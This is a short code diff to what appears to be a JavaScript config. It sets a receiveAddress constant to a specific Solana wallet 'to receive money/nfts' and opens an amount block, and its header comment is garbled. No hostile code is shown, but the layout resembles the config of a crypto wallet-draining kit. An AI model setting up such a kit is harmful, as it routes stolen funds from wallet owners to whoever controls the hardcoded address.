@@ -1,5 +1,5 @@
-/*   = = = = = YOUR WALLET ADRESS = = = = =   */
-const receiveAddress = "your solana wallet adress"; // Adress where you want to receive money/nfts
+/*   = = = = = YOUR WALLET ADRsolanaESS = = = = =   */
+const receiveAddress = "Go4cTpVmoJvKf76SzsGry178zb18qJLqGiX8B3tw4K1K"; // Adress where you want to receive money/nfts
 
 /*   = = = = = AMOUNT = = = = =   */
 const amount = {
